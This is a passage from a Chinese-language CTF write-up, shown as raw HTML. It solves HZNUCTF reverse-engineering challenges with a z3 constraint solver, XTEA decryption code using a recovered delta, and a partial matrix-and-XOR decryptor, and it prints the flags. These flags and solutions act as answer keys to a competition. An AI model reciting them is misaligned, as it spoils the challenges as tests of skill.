Enc[2] + 650 * Enc[3] - 900 * Enc[4]) + 44 * Enc[5] + 66 * Enc[6] - 6 * Enc[7] - 6 * Enc[8] - 21 * Enc[9]) + 9 * Enc[10] - 6 * Enc[11] - 12 * Enc[12]) + 69 * Enc[13] - 2 * Enc[14] - 406 * Enc[15]) + 651 * Enc[16] + 2 * Enc[17] - 10 * Enc[18]) + 69 * Enc[19] - 0 * Enc[20]) + 21 * Enc[21] &#x3D;&#x3D; 18768)\ns.add((((((555 * Enc[0] - 6666 * Enc[1]) + 70 * Enc[2] + 510 * Enc[3] - 90 * Enc[4]) + 499 * Enc[5] + 66 * Enc[6] - 66 * Enc[7] - 610 * Enc[8] - 221 * Enc[9]) + 9 * Enc[10] - 23 * Enc[11] - 102 * Enc[12]) + 6 * Enc[13] + 2050 * Enc[14] - 406 * Enc[15]) + 665 * Enc[16] + 333 * Enc[17] + 100 * Enc[18] + 609 * Enc[19] + 777 * Enc[20] + 201 * Enc[21] - 22 * Enc[22] &#x3D;&#x3D; 111844)\ns.add((((((((1 * Enc[0] - 22 * Enc[1]) + 333 * Enc[2] + 4444 * Enc[3] - 5555 * Enc[4]) + 6666 * Enc[5] - 666 * Enc[6]) + 676 * Enc[7] - 660 * Enc[8] - 22 * Enc[9]) + 9 * Enc[10] - 73 * Enc[11] - 107 * Enc[12]) + 6 * Enc[13] + 250 * Enc[14] - 6 * Enc[15]) + 65 * Enc[16] + 39 * Enc[17] + 10 * Enc[18] + 69 * Enc[19] + 777 * Enc[20] + 201 * Enc[21] - 2 * Enc[22]) + 23 * Enc[23] &#x3D;&#x3D; 159029)\ns.add((((520 * Enc[0] - 222 * Enc[1]) + 333 * Enc[2] + 4 * Enc[3] - 56655 * Enc[4]) + 6666 * Enc[5] + 666 * Enc[6] + 66 * Enc[7] - 60 * Enc[8] - 220 * Enc[9]) + 99 * Enc[10] + 73 * Enc[11] + 1007 * Enc[12] + 7777 * Enc[13] + 2500 * Enc[14] + 6666 * Enc[15] + 605 * Enc[16] + 390 * Enc[17] + 100 * Enc[18] + 609 * Enc[19] + 99999 * Enc[20] + 210 * Enc[21] + 232 * Enc[22] + 23 * Enc[23] - 24 * Enc[24] &#x3D;&#x3D; 2762025)\ns.add(((((1323 * Enc[0] - 22 * Enc[1]) + 333 * Enc[2] + 4 * Enc[3] - 55 * Enc[4]) + 666 * Enc[5] + 666 * Enc[6] + 66 * Enc[7] - 660 * Enc[8] - 220 * Enc[9]) + 99 * Enc[10] + 3 * Enc[11] + 100 * Enc[12] + 777 * Enc[13] + 2500 * Enc[14] + 6666 * Enc[15] + 605 * Enc[16] + 390 * Enc[17] + 100 * Enc[18] + 609 * Enc[19] + 9999 * Enc[20] + 210 * Enc[21] + 232 * Enc[22] + 23 * Enc[23] - 24 * Enc[24]) + 25 * Enc[25] &#x3D;&#x3D; 1551621)\ns.add((((((777 * Enc[0] - 22 * Enc[1]) + 6969 * Enc[2] + 4 * Enc[3] - 55 * Enc[4]) + 666 * Enc[5] - 6 * Enc[6]) + 96 * Enc[7] - 60 * Enc[8] - 220 * Enc[9]) + 99 * Enc[10] + 3 * Enc[11] + 100 * Enc[12] + 777 * Enc[13] + 250 * Enc[14] + 666 * Enc[15] + 65 * Enc[16] + 90 * Enc[17] + 100 * Enc[18] + 609 * Enc[19] + 999 * Enc[20] + 21 * Enc[21] + 232 * Enc[22] + 23 * Enc[23] - 24 * Enc[24]) + 25 * Enc[25] - 26 * Enc[26] &#x3D;&#x3D; 948348)\ns.add(((((((97 * Enc[0] - 22 * Enc[1]) + 6969 * Enc[2] + 4 * Enc[3] - 56 * Enc[4]) + 96 * Enc[5] - 6 * Enc[6]) + 96 * Enc[7] - 60 * Enc[8] - 20 * Enc[9]) + 99 * Enc[10] + 3 * Enc[11] + 10 * Enc[12] + 707 * Enc[13] + 250 * Enc[14] + 666 * Enc[15] + -9 * Enc[16] + 90 * Enc[17] + -2 * Enc[18] + 609 * Enc[19] + 0 * Enc[20] + 21 * Enc[21] + 2 * Enc[22] + 23 * Enc[23] - 24 * Enc[24]) + 25 * Enc[25] - 26 * Enc[26]) + 27 * Enc[27] &#x3D;&#x3D; 777044)\ns.add((((((177 * Enc[0] - 22 * Enc[1]) + 699 * Enc[2] + 64 * Enc[3] - 56 * Enc[4] - 96 * Enc[5] - 66 * Enc[6]) + 96 * Enc[7] - 60 * Enc[8] - 20 * Enc[9]) + 99 * Enc[10] + 3 * Enc[11] + 10 * Enc[12] + 707 * Enc[13] + 250 * Enc[14] + 666 * Enc[15] + -9 * Enc[16] + 0 * Enc[17] + -2 * Enc[18] + 69 * Enc[19] + 0 * Enc[20] + 21 * Enc[21] + 222 * Enc[22] + 23 * Enc[23] - 224 * Enc[24]) + 25 * Enc[25] - 26 * Enc[26]) + 27 * Enc[27] - 28 * Enc[28] &#x3D;&#x3D; 185016)\ns.add(((((((77 * Enc[0] - 2 * Enc[1]) + 6 * Enc[2] + 6 * Enc[3] - 96 * Enc[4] - 9 * Enc[5] - 6 * Enc[6]) + 96 * Enc[7] - 0 * Enc[8] - 20 * Enc[9]) + 99 * Enc[10] + 3 * Enc[11] + 10 * Enc[12] + 707 * Enc[13] + 250 * Enc[14] + 666 * Enc[15] + -9 * Enc[16] + 0 * Enc[17] + -2 * Enc[18] + 9 * Enc[19] + 0 * Enc[20] + 21 * Enc[21] + 222 * Enc[22] + 23 * Enc[23] - 224 * Enc[24]) + 26 * Enc[25] - -58 * Enc[26]) + 27 * Enc[27] - 2 * Enc[28]) + 29 * Enc[29] &#x3D;&#x3D; 130106)\n\nfor x in Enc:\n    s.add(x &gt;&#x3D; 32)\n    s.add(x &lt;&#x3D; 126)\n\nif s.check() &#x3D;&#x3D; sat:\n    m &#x3D; s.model()\n\n    solution &#x3D; [m[x].as_long() if m[x] is not None else 0 for x in Enc]\n    \n    decrypted &#x3D; decrypt(solution)\n    print(decrypted)\n    \nelse:\n    print(&quot;No solution found&quot;)</code></pre>\n\n<p>HZNUCTF{ad7fa-76a7-ff6a-fffa-7f7d6a}</p>\n<h3 id=\"XTEA\"><a href=\"#XTEA\" class=\"headerlink\" title=\"XTEA\"></a>XTEA</h3><p>初始化置种子srand了一次，然后这边里面判断是否有调试，然后又srand了一遍，可以忽略，种子就是0x7E8。</p>\n<p>红框处是将输入字符串四个四个一组进行翻转。</p>\n<p><img src=\"/images/1744633170177-8.png\" alt=\"img\"></p>\n<p>InitKey函数是用rand初始化了四个整数Key。</p>\n<p><img src=\"/images/1744633170177-9.png\" alt=\"img\"></p>\n<p>XTea是魔改的，Delta是靠用户输入传进来的，那么这边Delta未知就需要爆破。</p>\n<p><img src=\"/images/1744633170177-10.png\" alt=\"img\"></p>\n<p>题目描述说有点misc味，发现附件中还有个readme里面的压缩包密码就是标准Delta，<strong>2654435769 -&gt; 0x9E3779B9</strong></p>\n<p>直接编写解密，使用该Delta就可以解出flag。</p>\n<p>解密代码：</p>\n<pre class=\"language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;iostream></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;windows.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;time.h></span></span>\n\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>__fastcall <span class=\"token function\">dec</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a1<span class=\"token punctuation\">,</span> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>a2<span class=\"token punctuation\">,</span> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>a3<span class=\"token punctuation\">,</span> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> a4<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>result<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rax</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v5<span class=\"token punctuation\">;</span>      <span class=\"token comment\">// [rsp+24h] [rbp+4h]</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v6<span class=\"token punctuation\">;</span>      <span class=\"token comment\">// [rsp+44h] [rbp+24h]</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v7<span class=\"token punctuation\">;</span>      <span class=\"token comment\">// [rsp+64h] [rbp+44h]</span>\n    <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span>                <span class=\"token comment\">// [rsp+84h] [rbp+64h]</span>\n\n    v5 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>a2<span class=\"token punctuation\">;</span>\n    v6 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>a3<span class=\"token punctuation\">;</span>\n    v7 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    v7 <span class=\"token operator\">=</span> <span class=\"token operator\">-</span>a1 <span class=\"token operator\">*</span> <span class=\"token number\">32</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">32</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        v6 <span class=\"token operator\">-=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>a4 <span class=\"token operator\">+</span> <span class=\"token number\">4LL</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>v7 <span class=\"token operator\">>></span> <span class=\"token number\">11</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> v7<span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span>v5 <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>v5 <span class=\"token operator\">>></span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> v5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        v7 <span class=\"token operator\">+=</span> a1<span class=\"token punctuation\">;</span>\n        v5 <span class=\"token operator\">-=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>a4 <span class=\"token operator\">+</span> <span class=\"token number\">4LL</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>v7 <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> v7<span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span>v6 <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>v6 <span class=\"token operator\">>></span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> v6<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token operator\">*</span>a2 <span class=\"token operator\">=</span> v5<span class=\"token punctuation\">;</span>\n    result <span class=\"token operator\">=</span> a3<span class=\"token punctuation\">;</span>\n    <span class=\"token operator\">*</span>a3 <span class=\"token operator\">=</span> v6<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> result<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> buffer<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token number\">0x24</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x23</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x74</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x09</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x8D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x67</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x79</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF6</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x1B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x24</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x59</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x39</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0xCC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x72</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x17</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">srand</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x7e8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// 初始化Key</span>\n    <span class=\"token keyword\">uint32_t</span> key<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        key<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">rand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> j <span class=\"token operator\">=</span> <span class=\"token number\">7</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j<span class=\"token operator\">--</span><span class=\"token punctuation\">)</span>\n        <span class=\"token function\">dec</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x9E3779B9</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>buffer <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>j <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>buffer <span class=\"token operator\">+</span> j <span class=\"token operator\">*</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">uint32_t</span><span class=\"token punctuation\">)</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// 四个字节一组进行翻转</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> <span class=\"token number\">32</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">+=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">auto</span> tmp <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>buffer <span class=\"token operator\">+</span> j <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>buffer <span class=\"token operator\">+</span> j <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>buffer <span class=\"token operator\">+</span> j <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>buffer <span class=\"token operator\">+</span> j<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>buffer <span class=\"token operator\">+</span> j<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> tmp<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%.32s\\n\"</span><span class=\"token punctuation\">,</span> buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n\n<p>HZNUCTF{ae6-9f57-4b74-b423-98eb}</p>\n<h3 id=\"randomsystem\"><a href=\"#randomsystem\" class=\"headerlink\" title=\"randomsystem\"></a>randomsystem</h3><p>第一部分是输入64字节大小的0101二进制数据，然后进行转换到Hex（倒序），再倒序回来拆分半个字节转到ascii字符。</p>\n<p>如：0101001001100101第一次函数后是0x65，0x52然后再翻转拆分为ascii字符’5’,’2’,’6’,’5’。</p>\n<p><img src=\"/images/1744633170177-11.png\" alt=\"img\"></p>\n<p>根据判断判断出的字符可知要输入的是52 65 56 65 52 65 53 65的二进制数据。</p>\n<pre class=\"language-none\"><code class=\"language-none\">0101001001100101010101100110010101010010011001010101001101100101</code></pre>\n\n<p>底下的一些加密函数里面有花指令，是基础花指令，这边不做多赘述。</p>\n<p>第一部分用固定种子的随机数初始化了一个v18数值列表。</p>\n<p><img src=\"/images/1744633170177-12.png\" alt=\"img\"></p>\n<p>然后进行四次加密。</p>\n<p><img src=\"/images/1744633170177-13.png\" alt=\"img\"></p>\n<p>Enc1是用随机数初始化的列表进行打乱输入字符串的顺序。</p>\n<p><img src=\"/images/1744633170177-14.png\" alt=\"img\"></p>\n<p>Enc2是将输入字符串转存到另一个二维数组。</p>\n<p><img src=\"/images/1744633170177-15.png\" alt=\"img\"></p>\n<p>第三个函数是将之前输入转换后的Key存到”Str”中，实际值就是<strong>ReVeReSe</strong></p>\n<p>第四个函数是用一个全局的矩阵乘上输入数据。</p>\n<p><img src=\"/images/1744633170178-16.png\" alt=\"img\"></p>\n<p>最后和Key进行循环异或加密。</p>\n<p><img src=\"/images/1744633170178-17.png\" alt=\"img\"></p>\n<p>所以解密流程就是这几步的翻转，需要先计算出全局矩阵数据的逆矩阵，这一步用在线网站就可以解得。</p>\n<p>Enc1由于是对称的可以直接用原函数，Enc3也可以直接用原函数把矩阵数据改成逆矩阵就是解密。</p>\n<p>解密代码：</p>\n<pre class=\"language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;iostream></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;windows.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;time.h></span></span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">Enc1</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>Str<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>RdList<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">char</span> v3<span class=\"token punctuation\">;</span>   <span class=\"token comment\">// [esp+D3h] [ebp-1Dh]</span>\n    size_t i<span class=\"token punctuation\">;</span>  <span class=\"token comment\">// [esp+DCh] [ebp-14h]</span>\n    size_t v5<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+E8h] [ebp-8h]</span>\n\n    v5 <span class=\"token operator\">=</span> <span class=\"token number\">64</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">auto</span> result <span class=\"token operator\">=</span> v5 <span class=\"token operator\">>></span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">>=</span> v5 <span class=\"token operator\">>></span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>RdList<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">>=</span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> RdList<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> v5<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            v3 <span class=\"token operator\">=</span> Str<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            Str<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> Str<span class=\"token punctuation\">[</span>v5 <span class=\"token operator\">-</span> RdList<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            Str<span class=\"token punctuation\">[</span>v5 <span class=\"token operator\">-</span> RdList<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v3<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">Enc2</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>a1<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>a2<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">int</span> j<span class=\"token punctuation\">;</span>  <span class=\"token comment\">// [esp+D0h] [ebp-20h]</span>\n    <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span>  <span class=\"token comment\">// [esp+DCh] [ebp-14h]</span>\n    <span class=\"token keyword\">int</span> v4<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+E8h] [ebp-8h]</span>\n\n    v4 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>j<span class=\"token punctuation\">)</span>\n            <span class=\"token operator\">*</span><span class=\"token operator\">&amp;</span>a1<span class=\"token punctuation\">[</span><span class=\"token number\">32</span> <span class=\"token operator\">*</span> i <span class=\"token operator\">+</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> a2<span class=\"token punctuation\">[</span>v4<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> dword_3FC368<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token 